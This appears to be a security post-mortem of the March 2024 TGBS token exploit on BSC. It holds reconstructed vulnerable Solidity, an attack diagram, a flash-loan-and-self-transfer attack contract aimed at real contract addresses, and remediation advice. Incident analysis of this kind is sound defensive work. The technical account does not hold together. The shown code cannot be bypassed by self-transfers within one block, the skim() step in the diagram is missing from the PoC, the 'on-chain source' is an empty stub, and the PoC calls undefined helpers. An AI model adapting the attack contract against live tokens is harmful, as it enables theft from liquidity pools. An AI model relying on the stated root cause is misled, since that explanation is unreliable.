# TGBS — _burnBlock Burn Mechanism Bypass Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | TGBS |
| **Chain** | BSC |
| **Loss** | ~$150,000 |
| **Attacker** | [0xff1db040](https://bscscan.com/address/0xff1db040e4f2a44305e28f8de728dabff58f01e1) |
| **Attack Contract** | [0x1a8eb8ec](https://bscscan.com/address/0x1a8eb8eca01819b695637c55c1707f9497b51cd9) |
| **Vulnerable Contract** | [TGBS 0xedecfA18](https://bscscan.com/address/0xedecfA18CAE067b2489A2287784a543069f950F4) |
| **DPPOracle** | [0x05d968B7](https://bscscan.com/address/0x05d968B7101701b6AD5a69D45323746E9a791eB5) |
| **Root Cause** | The `_burnBlock()` function returns a block number used to determine whether token burning occurs; by performing 1,600+ self-transfers, the attacker bypasses the block number condition and accumulates large amounts of tokens without any burn |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/TGBS_exp.sol) |

---

## 1. Vulnerability Overview

The TGBS token transfer logic compares the current block number against a specific block number returned by the `_burnBlock()` function to determine whether a burn should occur. The attacker borrowed a large amount of WBNB via a DPP flash loan, swapped it for TGBS, then repeated 1,600 self-transfers to bypass the `_burnBlock()` condition — accumulating TGBS without any burns before swapping back to WBNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: _burnBlock condition can be bypassed via self-transfer
function _burnBlock() internal view returns (uint256) {
    // Returns a specific block number — a manipulable condition
    return startBlock + (block.number - startBlock) / BURN_INTERVAL * BURN_INTERVAL;
}

function _transfer(address from, address to, uint256 amount) internal override {
    // Burn is only executed when block.number == _burnBlock()
    if (block.number == _burnBlock()) {
        uint256 burnAmount = amount * burnRate / 10000;
        _burn(from, burnAmount);
        amount -= burnAmount;
    }
    // The same logic applies during self-transfer (from == to)
    // 1,600 self-transfers can push past the _burnBlock condition block
    super._transfer(from, to, amount);
}

// ✅ Safe code: self-transfer blocked + improved block-based burn
function _transfer(address from, address to, uint256 amount) internal override {
    require(from != to, "self transfer not allowed");
    if (shouldBurn(block.number)) {
        uint256 burnAmount = amount * burnRate / 10000;
        _burn(from, burnAmount);
        amount -= burnAmount;
    }
    super._transfer(from, to, amount);
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: TGBS_decompiled.sol
contract TGBS {
    function _burnBlock() external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DPP Flash Loan: borrow large amount of WBNB
  │
  ├─→ [2] Swap WBNB → TGBS
  │
  ├─→ [3] Repeat self-transfer 1,600 times
  │         └─ Advances past _burnBlock() condition block, bypassing burn
  │
  ├─→ [4] Extract accumulated TGBS via skim()
  │
  ├─→ [5] Swap TGBS → WBNB
  │
  └─→ [6] Repay flash loan + ~$150K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface ITGBS {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract AttackContract {
    ITGBS  constant TGBS    = ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);
    IDVM   constant dpp     = IDVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);
    IERC20 constant WBNB    = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function testExploit() external {
        dpp.flashLoan(wbnbAmount, 0, address(this), "");
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [1] Swap WBNB → TGBS
        swapWBNBToTGBS(wbnbAmount);

        // [2] Bypass _burnBlock condition via 1,600 self-transfers
        uint256 tgbsBal = TGBS.balanceOf(address(this));
        for (uint i = 0; i < 1600; i++) {
            TGBS.transfer(address(this), tgbsBal);
        }

        // [3] Swap TGBS → WBNB + repay flash loan
        swapTGBSToWBNB(TGBS.balanceOf(address(this)));
        WBNB.transfer(address(dpp), wbnbAmount);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Block-based burn condition bypass |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + repeated self-transfer) |
| **DApp Category** | Token with burn mechanism |
| **Impact** | Mass accumulation of TGBS without burns, then WBNB extraction |

## 6. Remediation Recommendations

1. **Block self-transfers**: Revert transfers where `from == to`
2. **Replace block-based burn with proportional burn**: Apply a fixed burn rate on every transfer without block conditions
3. **Limit transfer count per TX**: Cap the number of transfers from the same address within a single block
4. **Simplify burn conditions**: Use simple, predictable burn logic instead of complex block-based conditions

## 7. Lessons Learned

- Block number-based conditional logic can be bypassed by manipulating timing through repeated calls.
- Tokens that allow self-transfers can have their transfer logic state changes applied repeatedly in a loop.
- The more complex a burn mechanism is, the higher the risk of bypass — design it to be simple and verifiable.